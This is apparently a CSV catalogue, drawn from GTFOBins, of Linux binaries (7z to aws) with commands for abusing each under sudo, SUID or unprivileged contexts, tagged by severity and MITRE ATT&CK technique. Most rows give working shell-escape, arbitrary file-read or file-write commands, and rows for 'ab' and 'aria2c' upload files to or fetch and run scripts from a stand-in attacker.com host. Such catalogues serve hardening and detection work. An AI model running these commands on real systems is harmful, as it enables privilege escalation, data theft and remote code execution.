id,platform,command,description,category,severity,mapped_technique,reference
1,Linux,7z a -ttar -an -so /path/to/input-file | 7z e -ttar -si -so,Abuse the '7z' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/7z/
2,Linux,7z a -ttar -an -so /path/to/input-file | 7z e -ttar -si -so,Abuse the '7z' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/7z/
3,Linux,"R --no-save -e 'system(""/bin/sh"")'",Abuse the 'R' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/R/
4,Linux,"R --no-save -e 'system(""/bin/sh"")'",Abuse the 'R' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/R/
5,Linux,"R --no-save -e 'system(""/bin/sh"")'",Abuse the 'R' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/R/
6,Linux,aa-exec /bin/sh,Abuse the 'aa-exec' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/aa-exec/
7,Linux,aa-exec /bin/sh,Abuse the 'aa-exec' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/aa-exec/
8,Linux,aa-exec /bin/sh,Abuse the 'aa-exec' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/aa-exec/
9,Linux,ab -v2 http://attacker.com/path/to/input-file,Abuse the 'ab' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/ab/
10,Linux,ab -v2 http://attacker.com/path/to/input-file,Abuse the 'ab' binary (download) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/ab/
11,Linux,ab -v2 http://attacker.com/path/to/input-file,Abuse the 'ab' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/ab/
12,Linux,ab -p /path/to/input-file http://attacker.com/,Abuse the 'ab' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/ab/
13,Linux,ab -p /path/to/input-file http://attacker.com/,Abuse the 'ab' binary (upload) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/ab/
14,Linux,ab -p /path/to/input-file http://attacker.com/,Abuse the 'ab' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/ab/
15,Linux,echo -e 'x:\n\t/bin/sh 1>&0 2>&0' >/path/to/temp-file chmod +x /path/to/temp-file acr -r ./relative/path/to/temp-file,Abuse the 'acr' binary (command) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/acr/
16,Linux,echo -e 'x:\n\t/bin/sh 1>&0 2>&0' >/path/to/temp-file chmod +x /path/to/temp-file acr -r ./relative/path/to/temp-file,Abuse the 'acr' binary (command) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/acr/
17,Linux,echo -e 'x:\n\t/bin/sh 1>&0 2>&0' >/path/to/temp-file chmod +x /path/to/temp-file acr -r ./relative/path/to/temp-file,Abuse the 'acr' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/acr/
18,Linux,agetty -l /bin/sh -o -p -a root tty,Abuse the 'agetty' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/agetty/
19,Linux,alpine -F /path/to/input-file,"Abuse the 'alpine' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is displayed in the terminal interface. Other options might be available, for example, by pressing `S` is possible to save the file content elsewhere.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/alpine/
20,Linux,alpine -F /path/to/input-file,"Abuse the 'alpine' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is displayed in the terminal interface. Other options might be available, for example, by pressing `S` is possible to save the file content elsewhere.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/alpine/
21,Linux,alpine -F /path/to/input-file,"Abuse the 'alpine' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is displayed in the terminal interface. Other options might be available, for example, by pressing `S` is possible to save the file content elsewhere.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/alpine/
22,Linux,"echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >/path/to/temp-file ansible-playbook /path/to/temp-file",Abuse the 'ansible-playbook' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ansible-playbook/
23,Linux,"echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >/path/to/temp-file ansible-playbook /path/to/temp-file",Abuse the 'ansible-playbook' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/ansible-playbook/
24,Linux,ansible-test shell,Abuse the 'ansible-test' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ansible-test/
25,Linux,ansible-test shell,Abuse the 'ansible-test' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/ansible-test/
26,Linux,aoss /bin/sh,Abuse the 'aoss' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/aoss/
27,Linux,aoss /bin/sh,Abuse the 'aoss' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/aoss/
28,Linux,apache2 -f /path/to/input-file,Abuse the 'apache2' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The first line may be leaked as an error message.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/apache2/
29,Linux,apache2 -f /path/to/input-file,Abuse the 'apache2' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The first line may be leaked as an error message.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/apache2/
30,Linux,apache2 -f /path/to/input-file,Abuse the 'apache2' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The first line may be leaked as an error message.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/apache2/
31,Linux,apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /path/to/input-file',Abuse the 'apache2' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The first line may be leaked as an error message.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/apache2/
32,Linux,apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /path/to/input-file',Abuse the 'apache2' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The first line may be leaked as an error message.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/apache2/
33,Linux,apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /path/to/input-file',Abuse the 'apache2' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The first line may be leaked as an error message.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/apache2/
34,Linux,apache2ctl -c 'Include /path/to/input-file',Abuse the 'apache2ctl' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The first line only is likely leaked as an error message.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/apache2ctl/
35,Linux,apache2ctl -c 'Include /path/to/input-file',Abuse the 'apache2ctl' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The first line only is likely leaked as an error message.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/apache2ctl/
36,Linux,apport-cli -f 1 2 v,Abuse the 'apport-cli' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. The terminal interface expects some choices in order to spawn tha pager.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/apport-cli/
37,Linux,apt-get changelog apt,Abuse the 'apt-get' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/apt-get/
38,Linux,apt-get changelog apt,Abuse the 'apt-get' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/apt-get/
39,Linux,"echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' >/path/to/temp-file apt-get -y install -c /path/to/temp-file sl","Abuse the 'apt-get' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. For this to work the target package (i.e., `sl`) must not be already installed.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/apt-get/
40,Linux,"echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' >/path/to/temp-file apt-get -y install -c /path/to/temp-file sl","Abuse the 'apt-get' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. For this to work the target package (i.e., `sl`) must not be already installed.",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/apt-get/
41,Linux,apt-get update -o APT::Update::Pre-Invoke::=/bin/sh,Abuse the 'apt-get' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. When the shell exits the `update` command is actually executed.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/apt-get/
42,Linux,apt-get update -o APT::Update::Pre-Invoke::=/bin/sh,Abuse the 'apt-get' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. When the shell exits the `update` command is actually executed.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/apt-get/
43,Linux,aptitude changelog aptitude,Abuse the 'aptitude' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/aptitude/
44,Linux,aptitude changelog aptitude,Abuse the 'aptitude' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/aptitude/
45,Linux,ar r /path/to/output-file /path/to/input-file ar p /path/to/output-file,Abuse the 'ar' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/ar/
46,Linux,ar r /path/to/output-file /path/to/input-file ar p /path/to/output-file,Abuse the 'ar' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/ar/
47,Linux,ar r /path/to/output-file /path/to/input-file ar p /path/to/output-file,Abuse the 'ar' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/ar/
48,Linux,"mkdir -p ./etc/ grep -oP ""^CHROOT_VERSION='\K[^']+"" /usr/share/devtools/lib/archroot.sh >.arch-chroot touch ./etc/pacman.conf echo 'CARCH=true;/bin/sh;exit' >etc/makepkg.conf arch-nspawn .",Abuse the 'arch-nspawn' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/arch-nspawn/
49,Linux,echo /path/to/command >/path/to/temp-file chmod +x /path/to/temp-file aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain,Abuse the 'aria2c' binary (command) in a sudo context to escalate privileges or execute arbitrary actions. Note that the subprocess is immediately sent to the background.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/aria2c/
50,Linux,echo /path/to/command >/path/to/temp-file chmod +x /path/to/temp-file aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain,Abuse the 'aria2c' binary (command) in a suid context to escalate privileges or execute arbitrary actions. Note that the subprocess is immediately sent to the background.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/aria2c/
51,Linux,echo /path/to/command >/path/to/temp-file chmod +x /path/to/temp-file aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain,Abuse the 'aria2c' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions. Note that the subprocess is immediately sent to the background.,Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/aria2c/
52,Linux,aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa,"Abuse the 'aria2c' binary (command) in a sudo context to escalate privileges or execute arbitrary actions. The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script, e.g., `/path/to/command`. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/aria2c/
53,Linux,aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa,"Abuse the 'aria2c' binary (command) in a suid context to escalate privileges or execute arbitrary actions. The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script, e.g., `/path/to/command`. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/aria2c/
54,Linux,aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa,"Abuse the 'aria2c' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions. The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script, e.g., `/path/to/command`. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.",Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/aria2c/
55,Linux,aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file,"Abuse the 'aria2c' binary (download) in a sudo context to escalate privileges or execute arbitrary actions. Use `--allow-overwrite` if needed. Similarly `-o /path/to/ouput-file` can be omitted, in that case the file is saved to `input-file` in the current working directory.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/aria2c/
56,Linux,aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file,"Abuse the 'aria2c' binary (download) in a suid context to escalate privileges or execute arbitrary actions. Use `--allow-overwrite` if needed. Similarly `-o /path/to/ouput-file` can be omitted, in that case the file is saved to `input-file` in the current working directory.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/aria2c/
57,Linux,aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file,"Abuse the 'aria2c' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions. Use `--allow-overwrite` if needed. Similarly `-o /path/to/ouput-file` can be omitted, in that case the file is saved to `input-file` in the current working directory.",File Download,Low,T1105,https://gtfobins.github.io/gtfobins/aria2c/
58,Linux,aria2c -i /path/to/input-file,Abuse the 'aria2c' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is leaked as error messages.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/aria2c/
59,Linux,aria2c -i /path/to/input-file,Abuse the 'aria2c' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is leaked as error messages.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/aria2c/
60,Linux,aria2c -i /path/to/input-file,Abuse the 'aria2c' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is leaked as error messages.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/aria2c/
61,Linux,arj a /path/to/output-file /path/to/input-file arj p /path/to/output-file,Abuse the 'arj' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The `.arj` suffix will be added to `output-file`.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/arj/
62,Linux,arj a /path/to/output-file /path/to/input-file arj p /path/to/output-file,Abuse the 'arj' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The `.arj` suffix will be added to `output-file`.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/arj/
63,Linux,arj a /path/to/output-file /path/to/input-file arj p /path/to/output-file,Abuse the 'arj' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The `.arj` suffix will be added to `output-file`.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/arj/
64,Linux,echo DATA >output-file arj a x output-file arj e x /path/to/output-dir/,Abuse the 'arj' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. The `.arj` suffix will be added to `x`.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/arj/
65,Linux,echo DATA >output-file arj a x output-file arj e x /path/to/output-dir/,Abuse the 'arj' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. The `.arj` suffix will be added to `x`.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/arj/
66,Linux,echo DATA >output-file arj a x output-file arj e x /path/to/output-dir/,Abuse the 'arj' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. The `.arj` suffix will be added to `x`.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/arj/
67,Linux,arp -v -f /path/to/input-file,Abuse the 'arp' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Lines are likely leaked as error messages.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/arp/
68,Linux,arp -v -f /path/to/input-file,Abuse the 'arp' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. Lines are likely leaked as error messages.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/arp/
69,Linux,arp -v -f /path/to/input-file,Abuse the 'arp' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Lines are likely leaked as error messages.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/arp/
70,Linux,as @/path/to/input-file,Abuse the 'as' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Lines are likely leaked as error messages.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/as/
71,Linux,as @/path/to/input-file,Abuse the 'as' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. Lines are likely leaked as error messages.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/as/
72,Linux,as @/path/to/input-file,Abuse the 'as' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Lines are likely leaked as error messages.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/as/
73,Linux,ascii-xfr -ns /path/to/input-file,Abuse the 'ascii-xfr' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/ascii-xfr/
74,Linux,ascii-xfr -ns /path/to/input-file,Abuse the 'ascii-xfr' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/ascii-xfr/
75,Linux,ascii-xfr -ns /path/to/input-file,Abuse the 'ascii-xfr' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/ascii-xfr/
76,Linux,ascii85 /path/to/input-file | ascii85 --decode,Abuse the 'ascii85' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/ascii85/
77,Linux,ascii85 /path/to/input-file | ascii85 --decode,Abuse the 'ascii85' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/ascii85/
78,Linux,ash -c 'echo DATA >/path/to/output-file',Abuse the 'ash' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/ash/
79,Linux,ash -p -c 'echo DATA >/path/to/output-file',Abuse the 'ash' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/ash/
80,Linux,ash -c 'echo DATA >/path/to/output-file',Abuse the 'ash' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/ash/
81,Linux,ash,Abuse the 'ash' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ash/
82,Linux,ash -p,Abuse the 'ash' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/ash/
83,Linux,ash,Abuse the 'ash' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/ash/
84,Linux,aspell -c /path/to/input-file,Abuse the 'aspell' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The textual file is displayed in an interactive TUI showing only the parts that contain mispelled words.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/aspell/
85,Linux,aspell -c /path/to/input-file,Abuse the 'aspell' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The textual file is displayed in an interactive TUI showing only the parts that contain mispelled words.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/aspell/
86,Linux,aspell -c /path/to/input-file,Abuse the 'aspell' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The textual file is displayed in an interactive TUI showing only the parts that contain mispelled words.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/aspell/
87,Linux,aspell --conf /path/to/input-file,"Abuse the 'aspell' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The first word is likely displayed as error messaged, and converted to lowercase.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/aspell/
88,Linux,aspell --conf /path/to/input-file,"Abuse the 'aspell' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The first word is likely displayed as error messaged, and converted to lowercase.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/aspell/
89,Linux,aspell --conf /path/to/input-file,"Abuse the 'aspell' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The first word is likely displayed as error messaged, and converted to lowercase.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/aspell/
90,Linux,asterisk -r !/bin/sh,"Abuse the 'asterisk' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. A server instance must be already running, otherwise it can be started with `sudo asterisk -F`. Moreover, the invoking user must be able to access the socket.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/asterisk/
91,Linux,asterisk -r !/bin/sh,"Abuse the 'asterisk' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. A server instance must be already running, otherwise it can be started with `sudo asterisk -F`. Moreover, the invoking user must be able to access the socket.",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/asterisk/
92,Linux,asterisk -r !/bin/sh,"Abuse the 'asterisk' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. A server instance must be already running, otherwise it can be started with `sudo asterisk -F`. Moreover, the invoking user must be able to access the socket.",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/asterisk/
93,Linux,echo /path/to/command | at now,Abuse the 'at' binary (command) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/at/
94,Linux,echo /path/to/command | at now,Abuse the 'at' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/at/
95,Linux,"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null",Abuse the 'at' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. `tail` is used to pause the terminal.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/at/
96,Linux,"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null",Abuse the 'at' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. `tail` is used to pause the terminal.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/at/
97,Linux,atobm /path/to/input-file,"Abuse the 'atobm' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Outputs only the first line of the file to standard error without the `-` and `#` characters, this can be customized with the `-c` option, by default is `-c -#`. Content can be retrieved with `awk -F ""'"" '{printf ""%s"", $2}'`.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/atobm/
98,Linux,atobm /path/to/input-file,"Abuse the 'atobm' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. Outputs only the first line of the file to standard error without the `-` and `#` characters, this can be customized with the `-c` option, by default is `-c -#`. Content can be retrieved with `awk -F ""'"" '{printf ""%s"", $2}'`.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/atobm/
99,Linux,atobm /path/to/input-file,"Abuse the 'atobm' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Outputs only the first line of the file to standard error without the `-` and `#` characters, this can be customized with the `-c` option, by default is `-c -#`. Content can be retrieved with `awk -F ""'"" '{printf ""%s"", $2}'`.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/atobm/
100,Linux,echo /bin/sh >/path/to/temp-file chmod +x /path/to/temp-file touch configure.ac AUTOM4TE=/path/to/temp-file autoconf,Abuse the 'autoconf' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/autoconf/
101,Linux,echo /bin/sh >/path/to/temp-file chmod +x /path/to/temp-file touch configure.ac AUTOM4TE=/path/to/temp-file autoconf,Abuse the 'autoconf' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/autoconf/
102,Linux,echo '/bin/sh 1>&0' >/path/to/temp-file chmod +x /path/to/temp-file touch configure.ac AUTOM4TE=/path/to/temp-file autoheader,Abuse the 'autoheader' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/autoheader/
103,Linux,echo '/bin/sh 1>&0' >/path/to/temp-file chmod +x /path/to/temp-file touch configure.ac AUTOM4TE=/path/to/temp-file autoheader,Abuse the 'autoheader' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/autoheader/
104,Linux,echo '/bin/sh 1>&0' >/path/to/temp-file chmod +x /path/to/temp-file echo AC_INIT >configure.ac AUTOM4TE=/path/to/temp-file autoreconf,Abuse the 'autoreconf' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The shell is invoked multiple times.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/autoreconf/
105,Linux,echo '/bin/sh 1>&0' >/path/to/temp-file chmod +x /path/to/temp-file echo AC_INIT >configure.ac AUTOM4TE=/path/to/temp-file autoreconf,Abuse the 'autoreconf' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The shell is invoked multiple times.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/autoreconf/
106,Linux,aws ec2 describe-instances --filter file:///path/to/input-file,Abuse the 'aws' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/aws/
107,Linux,aws ec2 describe-instances --filter file:///path/to/input-file,Abuse the 'aws' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/aws/
108,Linux,aws ec2 describe-instances --filter file:///path/to/input-file,Abuse the 'aws' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/aws/
109,Linux,aws help,Abuse the 'aws' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/aws/
110,Linux,aws help,Abuse the 'aws' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/aws/
